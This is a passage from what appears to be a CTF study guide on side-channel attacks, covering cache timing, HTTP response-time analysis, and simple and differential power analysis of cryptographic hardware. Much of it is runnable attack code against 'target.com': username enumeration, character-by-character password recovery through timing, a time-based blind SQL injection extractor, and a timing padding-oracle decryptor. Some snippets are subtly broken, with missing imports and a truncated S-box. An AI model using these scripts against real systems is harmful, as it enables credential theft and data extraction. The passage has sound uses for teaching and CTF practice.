    likely_key_bytes = [k for k, _ in sorted_by_time[-10:]]
    
    return likely_key_bytes

def flush_cache():
    """[Inference] Cache flushing technique varies by system"""
    dummy = bytearray(10 * 1024 * 1024)  # 10MB
    for i in range(len(dummy)):
        dummy[i] = i & 0xFF
```

**CTF Cache Timing Reconnaissance:**

```bash
# Check CPU cache information
lscpu | grep -i cache

# Check cache line size
getconf LEVEL1_DCACHE_LINESIZE

# Monitor process cache behavior
perf stat -e L1-dcache-load-misses,L1-dcache-loads \
          -e LLC-load-misses,LLC-loads \
          -p <pid>

# System-wide cache monitoring
perf top -e cache-misses
```

### Response Time Analysis

Response time analysis examines aggregate timing characteristics across multiple requests to infer system behavior, authentication states, or data characteristics. Unlike single-request timing attacks, this technique analyzes patterns across many measurements to extract information.

**Network-Level Response Time Analysis:**

```bash
# Basic response time measurement
for i in {1..100}; do
    curl -w "@curl-format.txt" -o /dev/null -s https://target.com/api/endpoint
done

# curl-format.txt content:
cat > curl-format.txt << 'EOF'
time_namelookup: %{time_namelookup}\n
time_connect: %{time_connect}\n
time_appconnect: %{time_appconnect}\n
time_pretransfer: %{time_pretransfer}\n
time_redirect: %{time_redirect}\n
time_starttransfer: %{time_starttransfer}\n
time_total: %{time_total}\n
EOF

# Statistical analysis with awk
for i in {1..100}; do
    curl -w "%{time_total}\n" -o /dev/null -s https://target.com/api
done | awk '{sum+=$1; sumsq+=$1*$1} END {
    print "Mean:", sum/NR;
    print "StdDev:", sqrt(sumsq/NR - (sum/NR)^2)
}'
```

**HTTP Response Time Profiling:**

```python
import requests
import time
import statistics
import matplotlib.pyplot as plt
from collections import defaultdict

class ResponseTimeAnalyzer:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.measurements = defaultdict(list)
    
    def measure_endpoint(self, path, params=None, iterations=100):
        """Measure response times for specific endpoint"""
        url = f"{self.base_url}{path}"
        
        for i in range(iterations):
            start = time.perf_counter()
            try:
                response = self.session.get(url, params=params, timeout=10)
                elapsed = time.perf_counter() - start
                
                self.measurements[path].append({
                    'time': elapsed,
                    'status': response.status_code,
                    'size': len(response.content),
                    'iteration': i
                })
            except Exception as e:
                print(f"Error on iteration {i}: {e}")
            
            time.sleep(0.05)  # Small delay between requests
        
        return self.analyze_measurements(path)
    
    def analyze_measurements(self, path):
        """Statistical analysis of measurements"""
        times = [m['time'] for m in self.measurements[path]]
        
        analysis = {
            'count': len(times),
            'mean': statistics.mean(times),
            'median': statistics.median(times),
            'stdev': statistics.stdev(times) if len(times) > 1 else 0,
            'min': min(times),
            'max': max(times),
            'p95': statistics.quantiles(times, n=20)[18] if len(times) > 20 else max(times),
            'p99': statistics.quantiles(times, n=100)[98] if len(times) > 100 else max(times)
        }
        
        return analysis
    
    def compare_endpoints(self, endpoints):
        """Compare timing across multiple endpoints"""
        results = {}
        
        for endpoint in endpoints:
            print(f"[*] Testing {endpoint}")
            results[endpoint] = self.measure_endpoint(endpoint)
        
        # Sort by mean response time
        sorted_results = sorted(results.items(), 
                               key=lambda x: x[1]['mean'])
        
        print("\n=== Response Time Comparison ===")
        for endpoint, stats in sorted_results:
            print(f"\n{endpoint}:")
            print(f"  Mean: {stats['mean']:.4f}s")
            print(f"  Median: {stats['median']:.4f}s")
            print(f"  StdDev: {stats['stdev']:.4f}s")
            print(f"  P95: {stats['p95']:.4f}s")
        
        return results
    
    def visualize_distribution(self, path):
        """Plot response time distribution"""
        times = [m['time'] for m in self.measurements[path]]
        
        plt.figure(figsize=(12, 6))
        
        # Histogram
        plt.subplot(1, 2, 1)
        plt.hist(times, bins=50, edgecolor='black')
        plt.xlabel('Response Time (seconds)')
        plt.ylabel('Frequency')
        plt.title(f'Response Time Distribution: {path}')
        
        # Time series
        plt.subplot(1, 2, 2)
        plt.plot(times)
        plt.xlabel('Request Number')
        plt.ylabel('Response Time (seconds)')
        plt.title(f'Response Time Over Requests: {path}')
        
        plt.tight_layout()
        plt.savefig(f'timing_analysis_{path.replace("/", "_")}.png')
        print(f"[+] Visualization saved")

# Usage example
analyzer = ResponseTimeAnalyzer('https://target.com')

# Test multiple endpoints
endpoints = ['/api/user/1', '/api/user/999', '/api/admin/1']
analyzer.compare_endpoints(endpoints)

# Visualize specific endpoint
analyzer.visualize_distribution('/api/user/1')
```

**Authentication Bypass via Response Time:**

```python
import requests
import time
import statistics

def enumerate_users_by_timing(base_url, usernames, iterations=50):
    """
    Exploit timing differences between valid/invalid usernames
    """
    results = {}
    
    for username in usernames:
        times = []
        
        print(f"[*] Testing username: {username}")
        
        for _ in range(iterations):
            payload = {
                'username': username,
                'password': 'invalid_password_12345'
            }
            
            start = time.perf_counter()
            response = requests.post(f"{base_url}/login", 
                                    data=payload,
                                    timeout=10)
            elapsed = time.perf_counter() - start
            times.append(elapsed)
            
            time.sleep(0.02)  # Rate limiting consideration
        
        results[username] = {
            'mean': statistics.mean(times),
            'median': statistics.median(times),
            'stdev': statistics.stdev(times),
            'samples': times
        }
    
    # Analyze results
    print("\n=== Timing Analysis Results ===")
    sorted_results = sorted(results.items(), 
                           key=lambda x: x[1]['mean'],
                           reverse=True)
    
    valid_users = []
    baseline_mean = sorted_results[-1][1]['mean']
    
    for username, stats in sorted_results:
        # Users with significantly longer response times likely exist
        # (password hash computation takes time)
        time_diff = stats['mean'] - baseline_mean
        
        print(f"\n{username}:")
        print(f"  Mean: {stats['mean']:.6f}s")
        print(f"  Diff from baseline: {time_diff:.6f}s")
        print(f"  StdDev: {stats['stdev']:.6f}s")
        
        # [Inference] Threshold depends on implementation
        # Typically >50ms difference indicates valid user
        if time_diff > 0.05:
            print(f"  [!] Likely valid user")
            valid_users.append(username)
    
    return valid_users

# Test with candidate usernames
usernames = ['admin', 'administrator', 'root', 'user', 
             'test', 'guest', 'invalid123', 'nonexistent']
valid = enumerate_users_by_timing('https://target.com', usernames)
print(f"\n[+] Likely valid users: {valid}")
```

**Database Query Response Time Analysis:**

```python
import requests
import time
import string

def blind_sqli_timing(url, param, query_base, max_length=50):
    """
    Extract data from blind SQL injection using response time analysis
    """
    
    def test_condition(condition, delay=5):
        """Test if condition is true using time delay"""
        # MySQL: BENCHMARK or SLEEP
        # PostgreSQL: pg_sleep
        # MSSQL: WAITFOR DELAY
        payload = f"{query_base} AND IF({condition}, SLEEP({delay}), 0)"
        
        times = []
        for _ in range(3):  # Multiple samples
            start = time.perf_counter()
            try:
                requests.get(url, 
                           params={param: payload},
                           timeout=delay + 5)
            except:
                pass
            elapsed = time.perf_counter() - start
            times.append(elapsed)
        
        avg_time = statistics.mean(times)
        # Consider it delayed if average time exceeds threshold
        return avg_time > (delay - 1)
    
    def extract_string(sql_query):
        """Extract string value character by character"""
        result = ""
        charset = string.ascii_letters + string.digits + "_-@."
        
        for position in range(1, max_length + 1):
            found = False
            
            for char in charset:
                # Build condition: check if character at position matches
                condition = f"ASCII(SUBSTRING(({sql_query}),{position},1))={ord(char)}"
                
                print(f"[*] Testing position {position}, char '{char}'", end='\r')
                
                if test_condition(condition):
                    result += char
                    print(f"\n[+] Found: {result}")
                    found = True
                    break
            
            if not found:
                break
        
        return result
    
    # Example: Extract database version
    print("[*] Extracting database version...")
    version = extract_string("SELECT VERSION()")
    print(f"[+] Database version: {version}")
    
    return version

# Usage
url = "http://target.com/search"
param = "q"
query = "1' OR '1'='1"
blind_sqli_timing(url, param, query)
```

**Rate Limiting Detection via Response Time:**

```python
import requests
import time
import matplotlib.pyplot as plt

def detect_rate_limiting(url, max_requests=200):
    """
    Detect rate limiting by analyzing response time patterns
    """
    response_times = []
    request_numbers = []
    status_codes = []
    
    print(f"[*] Sending {max_requests} requests to detect rate limiting...")
    
    for i in range(max_requests):
        start = time.perf_counter()
        try:
            response = requests.get(url, timeout=10)
            elapsed = time.perf_counter() - start
            
            response_times.append(elapsed)
            request_numbers.append(i)
            status_codes.append(response.status_code)
            
            if i % 10 == 0:
                print(f"[*] Request {i}/{max_requests}", end='\r')
            
            # No artificial delay - testing rate limits
            
        except Exception as e:
            response_times.append(10.0)  # Timeout value
            request_numbers.append(i)
            status_codes.append(0)
    
    print(f"\n[+] Completed {max_requests} requests")
    
    # Analyze patterns
    print("\n=== Rate Limiting Analysis ===")
    
    # Calculate moving average
    window = 10
    moving_avg = []
    for i in range(len(response_times) - window):
        avg = sum(response_times[i:i+window]) / window
        moving_avg.append(avg)
    
    # Detect sudden increases
    threshold_multiplier = 2.0
    baseline = statistics.mean(response_times[:20])
    
    for i, time_val in enumerate(response_times):
        if time_val > baseline * threshold_multiplier:
            print(f"[!] Spike detected at request {i}: {time_val:.4f}s")
            print(f"    Status code: {status_codes[i]}")
            if i > 0:
                print(f"    Previous time: {response_times[i-1]:.4f}s")
    
    # Check for 429 Too Many Requests
    rate_limited = [i for i, code in enumerate(status_codes) if code == 429]
    if rate_limited:
        print(f"\n[!] Rate limiting detected at requests: {rate_limited}")
        print(f"[!] Rate limit appears to trigger around request {min(rate_limited)}")
    
    # Visualization
    plt.figure(figsize=(14, 6))
    
    plt.subplot(1, 2, 1)
    plt.plot(request_numbers, response_times, 'b-', alpha=0.5, label='Response Time')
    if moving_avg:
        plt.plot(request_numbers[window//2:-window//2+1], 
                moving_avg, 'r-', linewidth=2, label='Moving Average')
    plt.axhline(y=baseline, color='g', linestyle='--', label='Baseline')
    plt.xlabel('Request Number')
    plt.ylabel('Response Time (seconds)')
    plt.title('Response Time Pattern')
    plt.legend()
    plt.grid(True, alpha=0.3)
    
    plt.subplot(1, 2, 2)
    plt.scatter(request_numbers, status_codes, c=response_times, cmap='coolwarm')
    plt.xlabel('Request Number')
    plt.ylabel('Status Code')
    plt.title('Status Codes Over Time')
    plt.colorbar(label='Response Time (s)')
    plt.grid(True, alpha=0.3)
    
    plt.tight_layout()
    plt.savefig('rate_limiting_analysis.png')
    print("\n[+] Visualization saved to rate_limiting_analysis.png")
    
    return {
        'baseline': baseline,
        'mean': statistics.mean(response_times),
        'max': max(response_times),
        'rate_limited_at': min(rate_limited) if rate_limited else None,
        'status_codes': status_codes
    }

# Usage
results = detect_rate_limiting('https://target.com/api/endpoint')
print(f"\n[+] Baseline response time: {results['baseline']:.4f}s")
if results['rate_limited_at']:
    print(f"[+] Rate limiting triggered at request {results['rate_limited_at']}")
```

**API Endpoint Discovery via Response Time:**

```python
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

def discover_endpoints_by_timing(base_url, wordlist, threads=10):
    """
    Discover valid API endpoints by analyzing response time patterns
    """
    
    def test_endpoint(path):
        """Test individual endpoint and measure response time"""
        url = f"{base_url}/{path}"
        
        times = []
        status_codes = []
        
        for _ in range(5):  # Multiple samples for accuracy
            start = time.perf_counter()
            try:
                response = requests.get(url, timeout=5, allow_redirects=False)
                elapsed = time.perf_counter() - start
                times.append(elapsed)
                status_codes.append(response.status_code)
            except requests.exceptions.Timeout:
                times.append(5.0)
                status_codes.append(0)
            except:
                times.append(0)
                status_codes.append(0)
        
        return {
            'path': path,
            'mean_time': statistics.mean(times) if times else 0,
            'status_codes': status_codes,
            'most_common_status': max(set(status_codes), key=status_codes.count)
        }
    
    print(f"[*] Testing endpoints from wordlist...")
    results = []
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(test_endpoint, path.strip()): path 
                  for path in wordlist}
        
        for future in as_completed(futures):
            try:
                result = future.result()
                results.append(result)
                
                # Print interesting findings
                if result['most_common_status'] not in [404, 0]:
                    print(f"[+] {result['path']}: "
                          f"Status {result['most_common_status']}, "
                          f"Time {result['mean_time']:.4f}s")
            except Exception as e:
                print(f"[-] Error: {e}")
    
    # Analyze timing patterns
    print("\n=== Timing Pattern Analysis ===")
    
    # Group by status code
    by_status = {}
    for result in results:
        status = result['most_common_status']
        if status not in by_status:
            by_status[status] = []
        by_status[status].append(result)
    
    # Calculate baseline for 404s
    if 404 in by_status:
        baseline_404 = statistics.mean([r['mean_time'] 
                                       for r in by_status[404]])
        print(f"[*] Baseline 404 response time: {baseline_404:.4f}s")
    
    # Find anomalies
    print("\n[!] Potential valid endpoints (timing anomalies):")
    for result in sorted(results, key=lambda x: x['mean_time'], reverse=True):
        if result['most_common_status'] == 404:
            if result['mean_time'] > baseline_404 * 1.5:
                print(f"  {result['path']}: {result['mean_time']:.4f}s "
                      f"(significantly slower 404)")
    
    # Valid endpoints by status code
    print("\n[+] Discovered endpoints:")
    valid_statuses = [200, 201, 301, 302, 401, 403, 500]
    for status in valid_statuses:
        if status in by_status:
            print(f"\n  Status {status}:")
            for result in by_status[status]:
                print(f"    /{result['path']} ({result['mean_time']:.4f}s)")
    
    return results

# Usage with wordlist
wordlist = [
    'admin', 'api', 'login', 'logout', 'user', 'users',
    'config', 'settings', 'dashboard', 'profile',
    'api/v1/users', 'api/v1/admin', 'api/v2/users'
]

results = discover_endpoints_by_timing('https://target.com', wordlist)
```

**Padding Oracle Attack via Response Time:**

```python
import requests
import time
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

def timing_based_padding_oracle(url, ciphertext_param, iv, ciphertext):
    """
    Exploit padding oracle vulnerability using timing analysis
    """
    
    def check_padding(modified_ciphertext):
        """
        Check if padding is valid by measuring response time
        Invalid padding typically causes longer processing time
        """
        payload = {ciphertext_param: base64.b64encode(modified_ciphertext).decode()}
        
        times = []
        for _ in range(10):  # Multiple measurements
            start = time.perf_counter()
            try:
                response = requests.get(url, params=payload, timeout=5)
                elapsed = time.perf_counter() - start
                times.append(elapsed)
            except:
                times.append(5.0)
        
        avg_time = statistics.mean(times)
        
        # [Inference] Valid padding: faster response (normal processing)
        # Invalid padding: slower response (exception handling)
        # Threshold varies by implementation
        return avg_time < 0.3  # Adjust threshold based on testing
    
    def decrypt_block(previous_block, encrypted_block):
        """Decrypt single block using padding oracle"""
        block_size = len(encrypted_block)
        decrypted = bytearray(block_size)
        
        # Work backwards through the block
        for pad_value in range(1, block_size + 1):
            print(f"[*] Decrypting byte {block_size - pad_value + 1}/{block_size}")
            
            # Prepare modified previous block
            modified = bytearray(previous_block)
            
            # Set known bytes to produce correct padding
            for i in range(1, pad_value):
                modified[block_size - i] = previous_block[block_size - i] ^ \
                                           decrypted[block_size - i] ^ pad_value
            
            # Brute force current byte
            for guess in range(256):
                modified[block_size - pad_value] = guess
                
                test_ciphertext = bytes(modified) + encrypted_block
                
                if check_padding(test_ciphertext):
                    # Valid padding found
                    decrypted[block_size - pad_value] = \
                        guess ^ previous_block[block_size - pad_value] ^ pad_value
                    print(f"[+] Byte {block_size - pad_value}: "
                          f"{decrypted[block_size - pad_value]:02x}")
                    break
        
        return bytes(decrypted)
    
    # Split ciphertext into blocks
    block_size = 16  # AES block size
    blocks = [ciphertext[i:i+block_size] 
              for i in range(0, len(ciphertext), block_size)]
    
    # Decrypt each block
    plaintext = b''
    for i in range(1, len(blocks)):
        print(f"\n[*] Decrypting block {i}/{len(blocks)-1}")
        decrypted_block = decrypt_block(blocks[i-1], blocks[i])
        plaintext += decrypted_block
    
    # Remove padding
    try:
        plaintext = unpad(plaintext, block_size)
    except:
        pass
    
    return plaintext

# Usage example
url = "http://target.com/decrypt"
ciphertext = base64.b64decode("encrypted_data_here")
plaintext = timing_based_padding_oracle(url, "data", None, ciphertext)
print(f"\n[+] Decrypted plaintext: {plaintext}")
```

**Session Token Entropy Analysis:**

```python
import requests
import time
import hashlib
from collections import Counter

def analyze_token_generation_timing(url, num_tokens=100):
    """
    Analyze session token generation timing to detect weak RNG
    """
    tokens = []
    generation_times = []
    
    print(f"[*] Collecting {num_tokens} tokens...")
    
    for i in range(num_tokens):
        start = time.perf_counter()
        response = requests.get(f"{url}/new_session")
        elapsed = time.perf_counter() - start
        
        if response.status_code == 200:
            token = response.cookies.get('session_token') or \
                   response.json().get('token')
            
            if token:
                tokens.append(token)
                generation_times.append(elapsed)
                
                if i % 10 == 0:
                    print(f"[*] Collected {i}/{num_tokens} tokens", end='\r')
        
        time.sleep(0.1)
    
    print(f"\n[+] Collected {len(tokens)} tokens")
    
    # Timing analysis
    print("\n=== Token Generation Timing ===")
    print(f"Mean: {statistics.mean(generation_times):.6f}s")
    print(f"StdDev: {statistics.stdev(generation_times):.6f}s")
    print(f"Min: {min(generation_times):.6f}s")
    print(f"Max: {max(generation_times):.6f}s")
    
    # Check for timing correlation with token patterns
    timing_buckets = {}
    for token, timing in zip(tokens, generation_times):
        bucket = int(timing * 1000) // 10  # 10ms buckets
        if bucket not in timing_buckets:
            timing_buckets[bucket] = []
        timing_buckets[bucket].append(token)
    
    # Entropy analysis
    print("\n=== Token Entropy Analysis ===")
    
    # Character frequency
    all_chars = ''.join(tokens)
    char_freq = Counter(all_chars)
    print(f"Unique characters: {len(char_freq)}")
    print(f"Most common: {char_freq.most_common(5)}")
    
    # Sequential pattern detection
    for i in range(len(tokens) - 1):
        # Check if tokens are sequential (weak RNG indicator)
        if isinstance(tokens[i], str) and tokens[i].isdigit():
            try:
                diff = int(tokens[i+1]) - int(tokens[i])
                if abs(diff) < 10:
                    print(f"[!] Potential sequential tokens: {tokens[i]} -> {tokens[i+1]}")
            except:
                pass
    
    # Timing-based prediction attempt
    print("\n=== Timing-Based Prediction Analysis ===")
    
    # Group tokens by similar generation time
    similar_timing_threshold = 0.001  # 1ms
    for i, (token1, time1) in enumerate(zip(tokens[:-1], generation_times[:-1])):
        for j, (token2, time2) in enumerate(zip(tokens[i+1:], generation_times[i+1:]), i+1):
            if abs(time1 - time2) < similar_timing_threshold:
                print(f"[!] Similar timing: {token1[:10]}... ({time1:.6f}s) "
                      f"and {token2[:10]}... ({time2:.6f}s)")
                # Check if tokens share patterns
                common_prefix = len(os.path.commonprefix([token1, token2]))
                if common_prefix > len(token1) // 4:
                    print(f"    -> Common prefix length: {common_prefix}")
    
    return tokens, generation_times

# Usage
import os
tokens, times = analyze_token_generation_timing('https://target.com', 100)
```

**Timing Side-Channel in Authentication:**

```python
import requests
import time
import itertools
import string

def timing_auth_bypass(url, username_field='username', 
                      password_field='password', charset=None):
    """
    Exploit timing side-channels in authentication to recover credentials
    """
    if charset is None:
        charset = string.ascii_lowercase + string.digits
    
    def measure_response(username, password):
        """Measure authentication attempt response time"""
        data = {
            username_field: username,
            password_field: password
        }
        
        times = []
        for _ in range(15):  # Multiple samples for accuracy
            start = time.perf_counter()
            response = requests.post(url, data=data, timeout=10)
            elapsed = time.perf_counter() - start
            times.append(elapsed)
            time.sleep(0.01)
        
        # Remove outliers
        sorted_times = sorted(times)
        trimmed = sorted_times[2:-2]  # Remove top/bottom 2
        
        return statistics.mean(trimmed) if trimmed else statistics.mean(times)
    
    def find_valid_username(candidates):
        """Find valid username via timing difference"""
        print("[*] Testing usernames...")
        results = {}
        
        for username in candidates:
            avg_time = measure_response(username, 'invalid_password_xyz')
            results[username] = avg_time
            print(f"  {username}: {avg_time:.6f}s")
        
        # Longest time likely indicates valid user (password check executed)
        sorted_users = sorted(results.items(), key=lambda x: x[1], reverse=True)
        
        print(f"\n[+] Likely valid username: {sorted_users[0][0]}")
        return sorted_users[0][0]
    
    def recover_password_prefix(username, max_length=10):
        """Recover password character-by-character via timing"""
        password = ""
        
        for pos in range(max_length):
            print(f"\n[*] Testing position {pos+1}")
            best_char = None
            max_time = 0
            
            for char in charset:
                test_pass = password + char + 'a' * (max_length - pos - 1)
                
                avg_time = measure_response(username, test_pass)
                print(f"  {char}: {avg_time:.6f}s", end='\r')
                
                if avg_time > max_time:
                    max_time = avg_time
                    best_char = char
            
            if best_char:
                password += best_char
                print(f"\n[+] Found character: {best_char} -> {password}")
            else:
                break
        
        return password
    
    # Main attack flow
    usernames = ['admin', 'administrator', 'root', 'user']
    valid_username = find_valid_username(usernames)
    
    print(f"\n[*] Attempting password recovery for: {valid_username}")
    recovered_password = recover_password_prefix(valid_username)
    
    print(f"\n[+] Recovered password prefix: {recovered_password}")
    
    return valid_username, recovered_password

# Usage
username, password = timing_auth_bypass('https://target.com/login')
```

**CTF Tools for Response Time Analysis:**

```bash
# HTTPie with timing
pip3 install httpie

for i in {1..50}; do
    http --print=h GET https://target.com/api X-Custom-Header:value
done | grep -i "elapsed"

# Apache Bench for load testing and timing
ab -n 1000 -c 10 https://target.com/api/endpoint

# wrk for advanced HTTP benchmarking
wrk -t12 -c400 -d30s --latency https://target.com/api

# vegeta for load testing with detailed metrics
echo "GET https://target.com/api" | vegeta attack -duration=30s -rate=50 | \
    vegeta report -type=text

# Custom timing script with detailed metrics
cat > timing_test.sh << 'EOF'
#!/bin/bash
URL=$1
ITERATIONS=${2:-100}

for i in $(seq 1 $ITERATIONS); do
    curl -w "%{time_total},%{http_code},%{size_download}\n" \
         -o /dev/null -s "$URL"
done | awk -F',' '{
    sum+=$1; 
    count++; 
    times[count]=$1
} END {
    print "Mean:", sum/count
    print "Count:", count
}'
EOF

chmod +x timing_test.sh
./timing_test.sh https://target.com/api 100
```

**Important Related Topics:**

- **Blind SQL Injection Timing**: Advanced time-based data exfiltration techniques
- **Remote Timing Attack Mitigation**: Understanding constant-time implementations
- **Statistical Analysis Tools**: R, NumPy, SciPy for timing data analysis
- **Network Jitter Compensation**: Handling network variability in timing measurements

---

## Power Analysis

Power analysis attacks exploit variations in power consumption of cryptographic devices during computation to extract secret keys. These side-channel attacks are particularly effective against hardware implementations of cryptographic algorithms.

### Simple Power Analysis (SPA)

Simple Power Analysis examines power consumption traces from a single or few executions of cryptographic operations to directly observe correlations between data processing and power patterns.

**Core Concepts:**

- **Direct observation**: Visual inspection of power traces reveals algorithmic operations
- **Operation identification**: Different instructions (multiplication, squaring, XOR) have distinct power signatures
- **Conditional branches**: if/else statements in crypto implementations create observable patterns
- **Key-dependent operations**: Power consumption varies based on secret key bits being processed

**Target Vulnerabilities:**

SPA exploits implementations where:

- Operations differ based on key bits (e.g., square-and-multiply in RSA)
- Conditional branches depend on secret data
- Timing variations correlate with secret values
- No power consumption randomization exists

**Hardware Setup for SPA:**

Required equipment:

```bash
# Typical SPA setup components:
# - Target device (smartcard, embedded system, HSM)
# - Oscilloscope (minimum 200 MHz, preferably 1+ GHz)
# - Current probe or shunt resistor (typically 10-50 Ohm)
# - Trigger source (logic analyzer or GPIO)
# - Stable power supply with monitoring capability
```

**ChipWhisperer Setup (Common CTF Tool):**

```bash
# Install ChipWhisperer
git clone https://github.com/newaetech/chipwhisperer.git
cd chipwhisperer
pip install -e .

# Install Jupyter for analysis
pip install jupyter pandas matplotlib

# Launch ChipWhisperer
jupyter notebook
```

Basic capture configuration:

```python
import chipwhisperer as cw

# Connect to ChipWhisperer
scope = cw.scope()
target = cw.target(scope)

# Configure scope for SPA
scope.gain.db = 25  # Adjust based on signal strength
scope.adc.samples = 5000  # Number of samples per trace
scope.adc.offset = 0
scope.adc.basic_mode = "rising_edge"
scope.clock.clkgen_freq = 7370000  # Target clock frequency
scope.trigger.triggers = "tio4"  # Trigger pin

# Configure target
target.baud = 38400
```

**Capturing Power Traces:**

Single trace capture:

```python
# Reset target and arm scope
scope.arm()
target.simpleserial_write('p', bytearray([0x00]))  # Send plaintext

# Wait for trigger and capture
ret = scope.capture()
if ret:
    print("Timeout - no trigger detected")
else:
    trace = scope.get_last_trace()
    print(f"Captured {len(trace)} samples")
```

Multiple trace capture for analysis:

```python
import numpy as np

traces = []
plaintexts = []

for i in range(10):  # Capture 10 traces
    plaintext = bytearray([i] * 16)  # Different inputs
    
    scope.arm()
    target.simpleserial_write('p', plaintext)
    
    ret = scope.capture()
    if not ret:
        trace = scope.get_last_trace()
        traces.append(trace)
        plaintexts.append(plaintext)

traces = np.array(traces)
```

**Visual Analysis of SPA Traces:**

```python
import matplotlib.pyplot as plt

# Plot single trace
plt.figure(figsize=(15, 4))
plt.plot(trace)
plt.title("Power Consumption Trace")
plt.xlabel("Sample Number")
plt.ylabel("Power")
plt.grid(True)
plt.show()

# Zoom into specific operation
plt.figure(figsize=(15, 4))
plt.plot(trace[1000:2000])  # Focus on samples 1000-2000
plt.title("Zoomed Section - Operation Detail")
plt.xlabel("Sample Number")
plt.ylabel("Power")
plt.grid(True)
plt.show()
```

**Identifying Operations in SPA:**

RSA square-and-multiply example:

```python
# RSA implementations use square-and-multiply
# Binary exponentiation: for each bit in exponent d
#   if bit == 1: multiply and square
#   if bit == 0: only square

# Visually distinct patterns:
# - Square operation: shorter, consistent power pattern
# - Multiply operation: longer, higher power consumption

# Manual analysis to extract key bits
def identify_operations(trace, threshold=0.5):
    """
    [Inference] This assumes multiply operations exceed threshold
    """
    operations = []
    window_size = 100  # Adjust based on operation duration
    
    for i in range(0, len(trace), window_size):
        window = trace[i:i+window_size]
        if np.max(window) > threshold:
            operations.append('M')  # Multiply
        else:
            operations.append('S')  # Square
    
    return operations

ops = identify_operations(trace)
print("Operation sequence:", ''.join(ops))
```

**Exploiting Conditional Branches:**

Example: Password comparison with early exit:

```python
# Vulnerable code pattern:
# for i in range(len(password)):
#     if input[i] != password[i]:
#         return False
# return True

# Each incorrect character causes early exit
# Power trace length reveals correct character position

def timing_attack_spa(traces, inputs):
    """
    Analyze trace lengths to find correct password characters
    [Inference] Assumes longer traces mean more comparisons passed
    """
    trace_lengths = [len(t) for t in traces]
    
    for i, length in enumerate(trace_lengths):
        print(f"Input: {inputs[i]} - Trace length: {length}")
    
    # Longest trace indicates most characters matched
    max_idx = np.argmax(trace_lengths)
    return inputs[max_idx]
```

**AES T-Table Implementation SPA:**

[Inference] T-table lookups in AES software implementations may show distinct power patterns:

```python
# Identify T-table lookup operations
def find_table_lookups(trace):
    """
    Look for repeating patterns indicating table accesses
    [Unverified] Pattern recognition accuracy depends on implementation
    """
    from scipy.signal import find_peaks
    
    # Find peaks in power consumption (potential memory accesses)
    peaks, _ = find_peaks(trace, height=np.mean(trace))
    
    # Group peaks by distance (16 lookups per AES round)
    lookup_positions = []
    for i in range(0, len(peaks), 16):
        lookup_positions.append(peaks[i:i+16])
    
    return lookup_positions
```

**Tools for SPA Analysis:**

Inspector (part of ChipWhisperer):

```python
# Using ChipWhisperer Analyzer
from chipwhisperer.analyzer import aes_funcs

# Load traces
project = cw.open_project("spa_capture")
traces = project.waves

# Perform basic SPA
for i in range(len(traces)):
    plt.figure(figsize=(15, 3))
    plt.plot(traces[i])
    plt.title(f"Trace {i}")
    plt.show()
```

PicoScope for hardware capture:

```bash
# Using PicoScope software (proprietary)
# Alternative: sigrok-cli for open-source capture

# Capture with PicoScope 2000 series
picoscope-2000a --samples 100000 --timebase 8 --channel A --range 5V --output trace.csv

# Convert to NumPy array
python3 << EOF
import pandas as pd
import numpy as np

data = pd.read_csv('trace.csv')
trace = data['Channel A'].values
np.save('trace.npy', trace)
EOF
```

**SPA on Smart Cards:**

ISO 7816 smart card power analysis:

```bash
# Using pcsc_scan to identify card
pcsc_scan

# Capture during card operation with oscilloscope
# Trigger on card CLK or RST pin
# Monitor VCC current with series resistor

# Example: DES key extraction from card
# Each DES round shows distinct 16 iterations in power trace
```

**[Unverified]** Some implementations use dummy operations to obscure SPA patterns, but these may still be distinguishable through careful statistical analysis of operation timing.

### Differential Power Analysis (DPA)

Differential Power Analysis uses statistical methods across multiple power traces to extract secret keys, even when individual traces don't reveal information. DPA is more powerful than SPA and works against many SPA-resistant implementations.

**Core Concepts:**

- **Statistical correlation**: Compares predicted power consumption with actual measurements
- **Multiple traces**: Requires dozens to thousands of traces with different inputs
- **Partitioning**: Divides traces into groups based on hypothetical key values
- **Differential analysis**: Examines differences between trace groups to identify correct key

**DPA Theory:**

The fundamental DPA equation:

```
D[j] = AVG(Traces where bit b=1)[j] - AVG(Traces where bit b=0)[j]
```

Where:

- D[j] is differential trace at sample point j
- Bit b is predicted intermediate value based on key guess
- Significant peaks in D indicate correct key guess

**Setting Up DPA Attack:**

Required data:

```python
import numpy as np

# Load captured traces
traces = np.load('traces.npy')  # Shape: (num_traces, samples_per_trace)
plaintexts = np.load('plaintexts.npy')  # Known inputs
# ciphertexts = np.load('ciphertexts.npy')  # If attacking decryption

print(f"Traces shape: {traces.shape}")
print(f"Number of traces: {traces.shape[0]}")
print(f"Samples per trace: {traces.shape[1]}")
```

**DPA Against AES (First Round):**

Attacking first SubBytes operation:

```python
# AES S-box (standard lookup table)
sbox = [
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,
    # ... (full 256-byte S-box)
]

def aes_internal_state(plaintext_byte, key_byte):
    """
    Calculate intermediate value after AddRoundKey and SubBytes
    """
    state = plaintext_byte ^ key_byte  # AddRoundKey
    output = sbox[state]  # SubBytes
    return output

def hamming_weight(byte):
    """
    Count number of 1 bits (common power model)
    """
    return bin(byte).count('1')

# DPA attack on single key byte
def dpa_attack_byte(traces, plaintexts, byte_position):
    """
    Attack specific byte of first round key
    """
    num_traces = len(traces)
    correlations = np.zeros(256)  # One for each key guess
    
    for key_guess in range(256):
        # Predict intermediate values for all traces
        predicted_hw = np.array([
            hamming_weight(aes_internal_state(pt[byte_position], key_guess))
            for pt in plaintexts
        ])
        
        # Calculate correlation for each sample point
        max_correlation = 0
        for sample in range(traces.shape[1]):
            # Pearson correlation between predicted and actual power
            corr = np.corrcoef(predicted_hw, traces[:, sample])[0, 1]
            if abs(corr) > abs(max_correlation):
                max_correlation = corr
        
        correlations[key_guess] = max_correlation
    
    # Key with highest correlation is most likely correct
    recovered_key_byte = np.argmax(np.abs(correlations))
    return recovered_key_byte, correlations

# Attack all 16 key bytes
recovered_key = []
for byte_pos in range(16):
    key_byte, corrs = dpa_attack_byte(traces, plaintexts, byte_pos)
    recovered_key.append(key_byte)
    print(f"Byte {byte_pos}: 0x{key_byte:02x} (correlation: {np.max(np.abs(corrs)):.4f})")

print(f"\nRecovered key: {bytes(recovered_key).hex()}")
```

**Optimized DPA with ChipWhisperer:**

